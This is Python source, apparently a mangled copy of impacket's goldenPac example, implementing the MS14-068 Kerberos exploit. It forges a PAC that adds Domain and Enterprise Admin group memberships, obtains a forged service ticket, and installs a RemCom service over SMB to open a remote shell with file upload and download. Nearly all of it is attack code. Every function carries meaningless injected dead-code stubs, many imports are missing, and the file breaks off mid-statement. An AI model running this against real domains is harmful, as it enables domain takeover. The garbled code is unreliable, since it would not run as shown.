from __future__ import division
from __future__ import print_function
import cmd
import logging
import os
import random
import string
import time
from binascii import unhexlify
from threading import Thread, Lock
from six import PY3
from impacket.dcerpc.v5 import epm
from impacket.dcerpc.v5.drsuapi import MSRPC_UUID_DRSUAPI, hDRSDomainControllerInfo, DRSBind, NTDSAPI_CLIENT_GUID, DRS_EXTENSIONS_INT, DRS_EXT_GETCHGREQ_V6, DRS_EXT_GETCHGREPLY_V6, DRS_EXT_GETCHGREQ_V8, DRS_EXT_STRONG_ENCRYPTION, NULLGUID
from impacket.dcerpc.v5.dtypes import RPC_SID, MAXIMUM_ALLOWED
from impacket.dcerpc.v5.lsad import hLsarQueryInformationPolicy2, POLICY_INFORMATION_CLASS, hLsarOpenPolicy2
from impacket.dcerpc.v5.lsat import MSRPC_UUID_LSAT, POLICY_LOOKUP_NAMES
from impacket.dcerpc.v5.nrpc import MSRPC_UUID_NRPC, hDsrGetDcNameEx
from impacket.dcerpc.v5.rpcrt import TypeSerialization1, RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.krb5.pac import PKERB_VALIDATION_INFO, KERB_VALIDATION_INFO, KERB_SID_AND_ATTRIBUTES, PAC_CLIENT_INFO, PAC_SIGNATURE_DATA, PAC_INFO_BUFFER, PAC_LOGON_INFO, PAC_CLIENT_INFO_TYPE, PAC_SERVER_CHECKSUM, PAC_PRIVSVR_CHECKSUM, PACTYPE
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.examples import remcomsvc, serviceinstall
from impacket.smbconnection import SMBConnection, smb
from impacket.structure import Structure

def getFileTime(t):
    if False:
        while True:
            i = 10
    t *= 10000000
    t += 116444736000000000
    return t

class RemComMessage(Structure):
    structure = (('Command', '4096s=""'), ('WorkingDir', '260s=""'), ('Priority', '<L=0x20'), ('ProcessID', '<L=0x01'), ('Machine', '260s=""'), ('NoWait', '<L=0'))

class RemComResponse(Structure):
    structure = (('ErrorCode', '<L=0'), ('ReturnCode', '<L=0'))
RemComSTDOUT = 'RemCom_stdout'
RemComSTDIN = 'RemCom_stdin'
RemComSTDERR = 'RemCom_stderr'
lock = Lock()

class PSEXEC:

    def __init__(self, command, username, domain, smbConnection, TGS, copyFile):
        if False:
            for i in range(10):
                print('nop')
        self.__username = username
        self.__command = command
        self.__path = None
        self.__domain = domain
        self.__exeFile = None
        self.__copyFile = copyFile
        self.__TGS = TGS
        self.__smbConnection = smbConnection

    def run(self, addr):
        if False:
            for i in range(10):
                print('nop')
        rpctransport = transport.SMBTransport(addr, filename='/svcctl', smb_connection=self.__smbConnection)
        dce = rpctransport.get_dce_rpc()
        try:
            dce.connect()
        except Exception as e:
            logging.critical(str(e))
            sys.exit(1)
        global dialect
        dialect = rpctransport.get_smb_connection().getDialect()
        try:
            unInstalled = False
            s = rpctransport.get_smb_connection()
            s.setTimeout(100000)
            if self.__exeFile is None:
                installService = serviceinstall.ServiceInstall(rpctransport.get_smb_connection(), remcomsvc.RemComSvc())
            else:
                try:
                    f = open(self.__exeFile, 'rb')
                except Exception as e:
                    logging.critical(str(e))
                    sys.exit(1)
                installService = serviceinstall.ServiceInstall(rpctransport.get_smb_connection(), f)
            installService.install()
            if self.__exeFile is not None:
                f.close()
            if self.__copyFile is not None:
                installService.copy_file(self.__copyFile, installService.getShare(), os.path.basename(self.__copyFile))
                self.__command = os.path.basename(self.__copyFile) + ' ' + self.__command
            tid = s.connectTree('IPC$')
            fid_main = self.openPipe(s, tid, '\\RemCom_communicaton', 1180063)
            packet = RemComMessage()
            pid = os.getpid()
            packet['Machine'] = ''.join([random.choice(string.ascii_letters) for _ in range(4)])
            if self.__path is not None:
                packet['WorkingDir'] = self.__path
            packet['Command'] = self.__command
            packet['ProcessID'] = pid
            s.writeNamedPipe(tid, fid_main, packet.getData())
            global LastDataSent
            LastDataSent = ''
            stdin_pipe = RemoteStdInPipe(rpctransport, '\\%s%s%d' % (RemComSTDIN, packet['Machine'], packet['ProcessID']), smb.FILE_WRITE_DATA | smb.FILE_APPEND_DATA, self.__TGS, installService.getShare())
            stdin_pipe.start()
            stdout_pipe = RemoteStdOutPipe(rpctransport, '\\%s%s%d' % (RemComSTDOUT, packet['Machine'], packet['ProcessID']), smb.FILE_READ_DATA)
            stdout_pipe.start()
            stderr_pipe = RemoteStdErrPipe(rpctransport, '\\%s%s%d' % (RemComSTDERR, packet['Machine'], packet['ProcessID']), smb.FILE_READ_DATA)
            stderr_pipe.start()
            ans = s.readNamedPipe(tid, fid_main, 8)
            if len(ans):
                retCode = RemComResponse(ans)
                logging.info('Process %s finished with ErrorCode: %d, ReturnCode: %d' % (self.__command, retCode['ErrorCode'], retCode['ReturnCode']))
            installService.uninstall()
            if self.__copyFile is not None:
                s.deleteFile(installService.getShare(), os.path.basename(self.__copyFile))
            unInstalled = True
            sys.exit(retCode['ErrorCode'])
        except SystemExit:
            raise
        except Exception as e:
            logging.debug(str(e))
            if unInstalled is False:
                installService.uninstall()
                if self.__copyFile is not None:
                    s.deleteFile(installService.getShare(), os.path.basename(self.__copyFile))
            sys.stdout.flush()
            sys.exit(1)

    def openPipe(self, s, tid, pipe, accessMask):
        if False:
            while True:
                i = 10
        pipeReady = False
        tries = 50
        while pipeReady is False and tries > 0:
            try:
                s.waitNamedPipe(tid, pipe)
                pipeReady = True
            except Exception as e:
                print(str(e))
                tries -= 1
                time.sleep(2)
                pass
        if tries == 0:
            raise Exception('Pipe not ready, aborting')
        fid = s.openFile(tid, pipe, accessMask, creationOption=64, fileAttributes=128)
        return fid

class Pipes(Thread):

    def __init__(self, transport, pipe, permissions, TGS=None, share=None):
        if False:
            for i in range(10):
                print('nop')
        Thread.__init__(self)
        self.server = 0
        self.transport = transport
        self.credentials = transport.get_credentials()
        self.tid = 0
        self.fid = 0
        self.share = share
        self.port = transport.get_dport()
        self.pipe = pipe
        self.permissions = permissions
        self.TGS = TGS
        self.daemon = True

    def connectPipe(self):
        if False:
            return 10
        try:
            lock.acquire()
            global dialect
            self.server = SMBConnection('*SMBSERVER', self.transport.get_smb_connection().getRemoteHost(), sess_port=self.port, preferredDialect=dialect)
            (user, passwd, domain, lm, nt, aesKey, TGT, TGS) = self.credentials
            self.server.login(user, passwd, domain, lm, nt)
            lock.release()
            self.tid = self.server.connectTree('IPC$')
            self.server.waitNamedPipe(self.tid, self.pipe)
            self.fid = self.server.openFile(self.tid, self.pipe, self.permissions, creationOption=64, fileAttributes=128)
            self.server.setTimeout(1000000)
        except:
            logging.critical("Something wen't wrong connecting the pipes(%s), try again" % self.__class__)

class RemoteStdOutPipe(Pipes):

    def __init__(self, transport, pipe, permisssions):
        if False:
            print('Hello World!')
        Pipes.__init__(self, transport, pipe, permisssions)

    def run(self):
        if False:
            for i in range(10):
                print('nop')
        self.connectPipe()
        while True:
            try:
                ans = self.server.readFile(self.tid, self.fid, 0, 1024)
            except:
                pass
            else:
                try:
                    global LastDataSent
                    if ans != LastDataSent:
                        sys.stdout.write(ans.decode('cp437'))
                        sys.stdout.flush()
                    else:
                        LastDataSent = ''
                    if LastDataSent > 10:
                        LastDataSent = ''
                except:
                    pass

class RemoteStdErrPipe(Pipes):

    def __init__(self, transport, pipe, permisssions):
        if False:
            return 10
        Pipes.__init__(self, transport, pipe, permisssions)

    def run(self):
        if False:
            print('Hello World!')
        self.connectPipe()
        while True:
            try:
                ans = self.server.readFile(self.tid, self.fid, 0, 1024)
            except:
                pass
            else:
                try:
                    sys.stderr.write(str(ans))
                    sys.stderr.flush()
                except:
                    pass

class RemoteShell(cmd.Cmd):

    def __init__(self, server, port, credentials, tid, fid, TGS, share):
        if False:
            while True:
                i = 10
        cmd.Cmd.__init__(self, False)
        self.prompt = '\x08'
        self.server = server
        self.transferClient = None
        self.tid = tid
        self.fid = fid
        self.credentials = credentials
        self.share = share
        self.port = port
        self.TGS = TGS
        self.intro = '[!] Press help for extra shell commands'

    def connect_transferClient(self):
        if False:
            i = 10
            return i + 15
        self.transferClient = SMBConnection('*SMBSERVER', self.server.getRemoteHost(), sess_port=self.port, preferredDialect=dialect)
        (user, passwd, domain, lm, nt, aesKey, TGT, TGS) = self.credentials
        self.transferClient.kerberosLogin(user, passwd, domain, lm, nt, aesKey, TGS=self.TGS, useCache=False)

    def do_help(self, line):
        if False:
            while True:
                i = 10
        print('\n lcd {path}                 - changes the current local directory to {path}\n exit                       - terminates the server process (and this session)\n put {src_file, dst_path}   - uploads a local file to the dst_path RELATIVE to the connected share (%s)\n get {file}                 - downloads pathname RELATIVE to the connected share (%s) to the current local dir \n ! {cmd}                    - executes a local shell cmd\n' % (self.share, self.share))
        self.send_data('\r\n', False)

    def do_shell(self, s):
        if False:
            return 10
        os.system(s)
        self.send_data('\r\n')

    def do_get(self, src_path):
        if False:
            for i in range(10):
                print('nop')
        try:
            if self.transferClient is None:
                self.connect_transferClient()
            import ntpath
            filename = ntpath.basename(src_path)
            fh = open(filename, 'wb')
            logging.info('Downloading %s\\%s' % (self.share, src_path))
            self.transferClient.getFile(self.share, src_path, fh.write)
            fh.close()
        except Exception as e:
            logging.error(str(e))
            pass
        self.send_data('\r\n')

    def do_put(self, s):
        if False:
            i = 10
            return i + 15
        try:
            if self.transferClient is None:
                self.connect_transferClient()
            params = s.split(' ')
            if len(params) > 1:
                src_path = params[0]
                dst_path = params[1]
            elif len(params) == 1:
                src_path = params[0]
                dst_path = '/'
            src_file = os.path.basename(src_path)
            fh = open(src_path, 'rb')
            f = dst_path + '/' + src_file
            pathname = f.replace('/', '\\')
            logging.info('Uploading %s to %s\\%s' % (src_file, self.share, dst_path))
            if PY3:
                self.transferClient.putFile(self.share, pathname, fh.read)
            else:
                self.transferClient.putFile(self.share, pathname.decode(sys.stdin.encoding), fh.read)
            fh.close()
        except Exception as e:
            logging.error(str(e))
            pass
        self.send_data('\r\n')

    def do_lcd(self, s):
        if False:
            i = 10
            return i + 15
        if s == '':
            print(os.getcwd())
        else:
            try:
                os.chdir(s)
            except Exception as e:
                logging.error(str(e))
        self.send_data('\r\n')

    def emptyline(self):
        if False:
            print('Hello World!')
        self.send_data('\r\n')
        return

    def default(self, line):
        if False:
            while True:
                i = 10
        if PY3:
            self.send_data(line.encode('cp437') + b'\r\n')
        else:
            self.send_data(line.decode(sys.stdin.encoding).encode('cp437') + '\r\n')

    def send_data(self, data, hideOutput=True):
        if False:
            while True:
                i = 10
        if hideOutput is True:
            global LastDataSent
            LastDataSent = data
        else:
            LastDataSent = ''
        self.server.writeFile(self.tid, self.fid, data)

class RemoteStdInPipe(Pipes):

    def __init__(self, transport, pipe, permisssions, TGS=None, share=None):
        if False:
            while True:
                i = 10
        Pipes.__init__(self, transport, pipe, permisssions, TGS, share)

    def run(self):
        if False:
            return 10
        self.connectPipe()
        shell = RemoteShell(self.server, self.port, self.credentials, self.tid, self.fid, self.TGS, self.share)
        shell.cmdloop()

class MS14_068:
    CRC_32 = 1
    RSA_MD4 = 2
    RSA_MD5 = 7

    class VALIDATION_INFO(TypeSerialization1):
        structure = (('Data', PKERB_VALIDATION_INFO),)

    def __init__(self, target, targetIp=None, username='', password='', domain='', hashes=None, command='', copyFile=None, writeTGT=None, kdcHost=None):
        if False:
            print('Hello World!')
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__rid = 0
        self.__lmhash = ''
        self.__nthash = ''
        self.__target = target
        self.__targetIp = targetIp
        self.__kdcHost = None
        self.__copyFile = copyFile
        self.__command = command
        self.__writeTGT = writeTGT
        self.__domainSid = ''
        self.__forestSid = None
        self.__domainControllers = list()
        self.__kdcHost = kdcHost
        if hashes is not None:
            (self.__lmhash, self.__nthash) = hashes.split(':')
            self.__lmhash = unhexlify(self.__lmhash)
            self.__nthash = unhexlify(self.__nthash)

    def getGoldenPAC(self, authTime):
        if False:
            i = 10
            return i + 15
        aTime = timegm(strptime(str(authTime), '%Y%m%d%H%M%SZ'))
        unixTime = getFileTime(aTime)
        kerbdata = KERB_VALIDATION_INFO()
        kerbdata['LogonTime']['dwLowDateTime'] = unixTime & 4294967295
        kerbdata['LogonTime']['dwHighDateTime'] = unixTime >> 32
        kerbdata['LogoffTime']['dwLowDateTime'] = 4294967295
        kerbdata['LogoffTime']['dwHighDateTime'] = 2147483647
        kerbdata['KickOffTime']['dwLowDateTime'] = 4294967295
        kerbdata['KickOffTime']['dwHighDateTime'] = 2147483647
        kerbdata['PasswordLastSet']['dwLowDateTime'] = 0
        kerbdata['PasswordLastSet']['dwHighDateTime'] = 0
        kerbdata['PasswordCanChange']['dwLowDateTime'] = 0
        kerbdata['PasswordCanChange']['dwHighDateTime'] = 0
        kerbdata['PasswordMustChange']['dwLowDateTime'] = 4294967295
        kerbdata['PasswordMustChange']['dwHighDateTime'] = 2147483647
        kerbdata['EffectiveName'] = self.__username
        kerbdata['FullName'] = ''
        kerbdata['LogonScript'] = ''
        kerbdata['ProfilePath'] = ''
        kerbdata['HomeDirectory'] = ''
        kerbdata['HomeDirectoryDrive'] = ''
        kerbdata['LogonCount'] = 0
        kerbdata['BadPasswordCount'] = 0
        kerbdata['UserId'] = self.__rid
        kerbdata['PrimaryGroupId'] = 513
        groups = (513, 512, 520, 518, 519)
        kerbdata['GroupCount'] = len(groups)
        for group in groups:
            groupMembership = GROUP_MEMBERSHIP()
            groupId = NDRULONG()
            groupId['Data'] = group
            groupMembership['RelativeId'] = groupId
            groupMembership['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
            kerbdata['GroupIds'].append(groupMembership)
        kerbdata['UserFlags'] = 0
        kerbdata['UserSessionKey'] = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        kerbdata['LogonServer'] = ''
        kerbdata['LogonDomainName'] = self.__domain
        kerbdata['LogonDomainId'] = self.__domainSid
        kerbdata['LMKey'] = b'\x00\x00\x00\x00\x00\x00\x00\x00'
        kerbdata['UserAccountControl'] = USER_NORMAL_ACCOUNT | USER_DONT_EXPIRE_PASSWORD
        kerbdata['SubAuthStatus'] = 0
        kerbdata['LastSuccessfulILogon']['dwLowDateTime'] = 0
        kerbdata['LastSuccessfulILogon']['dwHighDateTime'] = 0
        kerbdata['LastFailedILogon']['dwLowDateTime'] = 0
        kerbdata['LastFailedILogon']['dwHighDateTime'] = 0
        kerbdata['FailedILogonCount'] = 0
        kerbdata['Reserved3'] = 0
        if self.__forestSid is not None:
            extraSids = ('%s-%s' % (self.__forestSid, '519'),)
            kerbdata['SidCount'] = len(extraSids)
            kerbdata['UserFlags'] |= 32
        else:
            extraSids = ()
            kerbdata['SidCount'] = len(extraSids)
        for extraSid in extraSids:
            sidRecord = KERB_SID_AND_ATTRIBUTES()
            sid = RPC_SID()
            sid.fromCanonical(extraSid)
            sidRecord['Sid'] = sid
            sidRecord['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
            kerbdata['ExtraSids'].append(sidRecord)
        kerbdata['ResourceGroupDomainSid'] = NULL
        kerbdata['ResourceGroupCount'] = 0
        kerbdata['ResourceGroupIds'] = NULL
        validationInfo = self.VALIDATION_INFO()
        validationInfo['Data'] = kerbdata
        if logging.getLogger().level == logging.DEBUG:
            logging.debug('VALIDATION_INFO')
            validationInfo.dump()
            print('\n')
        validationInfoBlob = validationInfo.getData() + validationInfo.getDataReferents()
        validationInfoAlignment = b'\x00' * ((len(validationInfoBlob) + 7) // 8 * 8 - len(validationInfoBlob))
        pacClientInfo = PAC_CLIENT_INFO()
        pacClientInfo['ClientId'] = unixTime
        try:
            name = self.__username.encode('utf-16le')
        except UnicodeDecodeError:
            import sys
            name = self.__username.decode(sys.getfilesystemencoding()).encode('utf-16le')
        pacClientInfo['NameLength'] = len(name)
        pacClientInfo['Name'] = name
        pacClientInfoBlob = pacClientInfo.getData()
        pacClientInfoAlignment = b'\x00' * ((len(pacClientInfoBlob) + 7) // 8 * 8 - len(pacClientInfoBlob))
        serverChecksum = PAC_SIGNATURE_DATA()
        serverChecksum['SignatureType'] = self.RSA_MD5
        serverChecksum['Signature'] = b'\x00' * 16
        serverChecksumBlob = serverChecksum.getData()
        serverChecksumAlignment = b'\x00' * ((len(serverChecksumBlob) + 7) // 8 * 8 - len(serverChecksumBlob))
        privSvrChecksum = PAC_SIGNATURE_DATA()
        privSvrChecksum['SignatureType'] = self.RSA_MD5
        privSvrChecksum['Signature'] = b'\x00' * 16
        privSvrChecksumBlob = privSvrChecksum.getData()
        privSvrChecksumAlignment = b'\x00' * ((len(privSvrChecksumBlob) + 7) // 8 * 8 - len(privSvrChecksumBlob))
        offsetData = 8 + len(PAC_INFO_BUFFER().getData()) * 4
        validationInfoIB = PAC_INFO_BUFFER()
        validationInfoIB['ulType'] = PAC_LOGON_INFO
        validationInfoIB['cbBufferSize'] = len(validationInfoBlob)
        validationInfoIB['Offset'] = offsetData
        offsetData = (offsetData + validationInfoIB['cbBufferSize'] + 7) // 8 * 8
        pacClientInfoIB = PAC_INFO_BUFFER()
        pacClientInfoIB['ulType'] = PAC_CLIENT_INFO_TYPE
        pacClientInfoIB['cbBufferSize'] = len(pacClientInfoBlob)
        pacClientInfoIB['Offset'] = offsetData
        offsetData = (offsetData + pacClientInfoIB['cbBufferSize'] + 7) // 8 * 8
        serverChecksumIB = PAC_INFO_BUFFER()
        serverChecksumIB['ulType'] = PAC_SERVER_CHECKSUM
        serverChecksumIB['cbBufferSize'] = len(serverChecksumBlob)
        serverChecksumIB['Offset'] = offsetData
        offsetData = (offsetData + serverChecksumIB['cbBufferSize'] + 7) // 8 * 8
        privSvrChecksumIB = PAC_INFO_BUFFER()
        privSvrChecksumIB['ulType'] = PAC_PRIVSVR_CHECKSUM
        privSvrChecksumIB['cbBufferSize'] = len(privSvrChecksumBlob)
        privSvrChecksumIB['Offset'] = offsetData
        buffers = validationInfoIB.getData() + pacClientInfoIB.getData() + serverChecksumIB.getData() + privSvrChecksumIB.getData() + validationInfoBlob + validationInfoAlignment + pacClientInfo.getData() + pacClientInfoAlignment
        buffersTail = serverChecksum.getData() + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment
        pacType = PACTYPE()
        pacType['cBuffers'] = 4
        pacType['Version'] = 0
        pacType['Buffers'] = buffers + buffersTail
        blobToChecksum = pacType.getData()
        serverChecksum['Signature'] = MD5.new(blobToChecksum).digest()
        privSvrChecksum['Signature'] = MD5.new(serverChecksum['Signature']).digest()
        buffersTail = serverChecksum.getData() + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment
        pacType['Buffers'] = buffers + buffersTail
        authorizationData = AuthorizationData()
        authorizationData[0] = noValue
        authorizationData[0]['ad-type'] = int(constants.AuthorizationDataType.AD_WIN2K_PAC.value)
        authorizationData[0]['ad-data'] = pacType.getData()
        return encoder.encode(authorizationData)

    def getKerberosTGS(self, serverName, domain, kdcHost, tgt, cipher, sessionKey, authTime):
        if False:
            return 10
        goldenPAC = self.getGoldenPAC(authTime)
        decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
        ticket = Ticket()
        ticket.from_asn1(decodedTGT['ticket'])
        ifRelevant = AD_IF_RELEVANT()
        ifRelevant[0] = noValue
        ifRelevant[0]['ad-type'] = int(constants.AuthorizationDataType.AD_IF_RELEVANT.value)
        ifRelevant[0]['ad-data'] = goldenPAC
        encodedIfRelevant = encoder.encode(ifRelevant)
        encryptedEncodedIfRelevant = cipher.encrypt(sessionKey, 4, encodedIfRelevant, None)
        tgsReq = TGS_REQ()
        reqBody = seq_set(tgsReq, 'req-body')
        opts = list()
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.proxiable.value)
        reqBody['kdc-options'] = constants.encodeFlags(opts)
        seq_set(reqBody, 'sname', serverName.components_to_asn1)
        reqBody['realm'] = decodedTGT['crealm'].prettyPrint()
        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.SystemRandom().getrandbits(31)
        seq_set_iter(reqBody, 'etype', (cipher.enctype,))
        reqBody['enc-authorization-data'] = noValue
        reqBody['enc-authorization-data']['etype'] = int(cipher.enctype)
        reqBody['enc-authorization-data']['cipher'] = encryptedEncodedIfRelevant
        apReq = AP_REQ()
        apReq['pvno'] = 5
        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
        opts = list()
        apReq['ap-options'] = constants.encodeFlags(opts)
        seq_set(apReq, 'ticket', ticket.to_asn1)
        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = decodedTGT['crealm'].prettyPrint()
        clientName = Principal()
        clientName.from_asn1(decodedTGT, 'crealm', 'cname')
        seq_set(authenticator, 'cname', clientName.components_to_asn1)
        now = datetime.datetime.utcnow()
        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)
        encodedAuthenticator = encoder.encode(authenticator)
        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)
        apReq['authenticator'] = noValue
        apReq['authenticator']['etype'] = cipher.enctype
        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator
        encodedApReq = encoder.encode(apReq)
        tgsReq['pvno'] = 5
        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
        tgsReq['padata'] = noValue
        tgsReq['padata'][0] = noValue
        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgsReq['padata'][0]['padata-value'] = encodedApReq
        pacRequest = KERB_PA_PAC_REQUEST()
        pacRequest['include-pac'] = False
        encodedPacRequest = encoder.encode(pacRequest)
        tgsReq['padata'][1] = noValue
        tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
        tgsReq['padata'][1]['padata-value'] = encodedPacRequest
        message = encoder.encode(tgsReq)
        r = sendReceive(message, domain, kdcHost)
        tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]
        cipherText = tgs['enc-part']['cipher']
        plainText = cipher.decrypt(sessionKey, 8, cipherText)
        encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]
        newSessionKey = Key(cipher.enctype, encTGSRepPart['key']['keyvalue'].asOctets())
        return (r, cipher, sessionKey, newSessionKey)

    def getForestSid(self):
        if False:
            for i in range(10):
                print('nop')
        logging.debug('Calling NRPC DsrGetDcNameEx()')
        stringBinding = 'ncacn_np:%s[\\pipe\\netlogon]' % self.__kdcHost
        rpctransport = transport.DCERPCTransportFactory(stringBinding)
        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(MSRPC_UUID_NRPC)
        resp = hDsrGetDcNameEx(dce, NULL, NULL, NULL, NULL, 0)
        forestName = resp['DomainControllerInfo']['DnsForestName'][:-1]
        logging.debug('DNS Forest name is %s' % forestName)
        dce.disconnect()
        logging.debug('Calling LSAT hLsarQueryInformationPolicy2()')
        stringBinding = 'ncacn_np:%s[\\pipe\\lsarpc]' % forestName
        rpctransport = transport.DCERPCTransportFactory(stringBinding)
        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(MSRPC_UUID_LSAT)
        resp = hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | POLICY_LOOKUP_NAMES)
        policyHandle = resp['PolicyHandle']
        resp = hLsarQueryInformationPolicy2(dce, policyHandle, POLICY_INFORMATION_CLASS.PolicyAccountDomainInformation)
        dce.disconnect()
        forestSid = resp['PolicyInformation']['PolicyAccountDomainInfo']['DomainSid'].formatCanonical()
        logging.info('Forest SID: %s' % forestSid)
        return forestSid

    def getDomainControllers(self):
        if False:
            print('Hello World!')
        logging.debug('Calling DRSDomainControllerInfo()')
        stringBinding = epm.hept_map(self.__domain, MSRPC_UUID_DRSUAPI, protocol='ncacn_ip_tcp')
        rpctransport = transport.DCERPCTransportFactory(stringBinding)
        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
        dce = rpctransport.get_dce_rpc()
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_INTEGRITY)
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        dce.connect()
        dce.bind(MSRPC_UUID_DRSUAPI)
        request = DRSBind()
        request['puuidClientDsa'] = NTDSAPI_CLIENT_GUID
        drs = DRS_EXTENSIONS_INT()
        drs['cb'] = len(drs)
        drs['dwFlags'] = DRS_EXT_GETCHGREQ_V6 | DRS_EXT_GETCHGREPLY_V6 | DRS_EXT_GETCHGREQ_V8 | DRS_EXT_STRONG_ENCRYPTION
        drs['SiteObjGuid'] = NULLGUID
        drs['Pid'] = 0
        drs['dwReplEpoch'] = 0
        drs['dwFlagsExt'] = 0
        drs['ConfigObjGUID'] = NULLGUID
        drs['dwExtCaps'] = 127
        request['pextClient']['cb'] = len(drs.getData())
        request['pextClient']['rgb'] = list(drs.getData())
        resp = dce.request(request)
        dcs = hDRSDomainControllerInfo(dce, resp['phDrs'], self.__domain, 1)
        dce.disconnect()
        domainControllers = list()
        for dc in dcs['pmsgOut']['V1']['rItems']:
            logging.debug('Found domain controller %s' % dc['DnsHostName'][:-1])
            domainControllers.append(dc['DnsHostName'][:-1])
        return domainControllers

    def getUserSID(self):
        if False:
            i = 10
            return i + 15
        stringBinding = 'ncacn_np:%s[\\pipe\\samr]' % self.__kdcHost
        rpctransport = transport.DCERPCTransportFactory(stringBinding)
        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(samr.MSRPC_UUID_SAMR)
        resp = samr.hSamrConnect(dce)
        serverHandle = resp['ServerHandle']
        resp = samr.hSamrLookupDomainInSamServer(dce, serverHandle, self.__domain)
        domainId = resp['DomainId']
        resp = samr.hSamrOpenDomain(dce, serverHandle, domainId=domainId)
        domainHandle = resp['DomainHandle']
        resp = samr.hSamrLookupNamesInDomain(dce, domainHandle, (self.__username,))
        rid = resp['RelativeIds']['Element'][0]['Data']
        logging.info('User SID: %s-%s' % (domainId.formatCanonical(), rid))
        return (domainId, rid)

    def exploit(self):
        if False:
            while True:
                i = 10
        if self.__kdcHost is None:
            getDCs = True
            self.__kdcHost = self.__domain
        else:
            getDCs = False
        (self.__domainSid, self.__rid) = self.getUserSID()
        try:
            self.__forestSid = self.getForestSid()
        except Exception as e:
            logging.error("Couldn't get forest info (%s), continuing" % str(e))
            self.__forestSid = None
        if getDCs is False:
            self.__domainControllers.append(self.__kdcHost)
        else:
            self.__domainControllers = self.getDomainControllers()
        userName = Principal(self.__username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        for dc in self.__domainControllers:
            logging.info('Attacking domain controller %s' % dc)
            self.__kdcHost = dc
            exception = None
            while True:
                try:
                    (tgt, cipher, oldSessionKey, sessionKey) = getKerberosTGT(userName, self.__password, self.__domain, self.__lmhash, self.__nthash, None, self.__kdcHost, requestPAC=False)
                except KerberosError as e:
                    if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                        if self.__lmhash == '' and self.__nthash == '':
                            from impacket.ntlm import compute_lmhash, compute_nthash
                            self.__lmhash = compute_lmhash(self.__password)
                            self.__nthash = compute_nthash(self.__password)
                            continue
                        else:
                            exception = str(e)
                            break
                    else:
                        exception = str(e)
                        break
                asRep = decoder.decode(tgt, asn1Spec=AS_REP())[0]
                salt = ''
                if asRep['padata']:
                    for pa in asRep['padata']:
                        if pa['padata-type'] == constants.PreAuthenticationDataTypes.PA_ETYPE_INFO2.value:
                            etype2 = decoder.decode(pa['padata-value'][2:], asn1Spec=ETYPE_INFO2_ENTRY())[0]
                            salt = etype2['salt'].prettyPrint()
                cipherText = asRep['enc-part']['cipher']
                if self.__nthash != '':
                    key = Key(cipher.enctype, self.__nthash)
                else:
                    key = cipher.string_to_key(self.__password, salt, None)
                plainText = cipher.decrypt(key, 3, cipherText)
                encASRepPart = decoder.decode(plainText, asn1Spec=EncASRepPart())[0]
                authTime = encASRepPart['authtime']
                serverName = Principal('krbtgt/%s' % self.__domain.upper(), type=constants.PrincipalNameType.NT_PRINCIPAL.value)
                (tgs, cipher, oldSessionKey, sessionKey) = self.getKerberosTGS(serverName, domain, self.__kdcHost, tgt, cipher, sessionKey, authTime)
                serverName = Principal('cifs/%s' % self.__target, type=constants.PrincipalNameType.NT_SRV_INST.value)
                try:
                    (tgsCIFS, cipher, oldSessionKeyCIFS, sessionKeyCIFS) = getKerberosTGS(serverName, domain, self.__kdcHost, tgs, cipher, sessionKey)
                except KerberosError as e:
                    if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                        if self.__lmhash == '' and self.__nthash == '':
                            from impacket.ntlm import compute_lmhash, compute_nthash
                            self.__lmhash = compute_lmhash(self.__password)
                            self.__nthash = compute_nthash(self.__password)
                        else:
                            exception = str(e)
                            break
                    else:
                        exception = str(e)
                        break
                else:
                    if self.__writeTGT is not None:
                        from impacket.krb5.ccache import CCache
                        ccache = CCache()
                        ccache.fromTGS(tgs, oldSessionKey, sessionKey)
                        ccache.saveFile(self.__writeTGT)
                    break
            if exception is None:
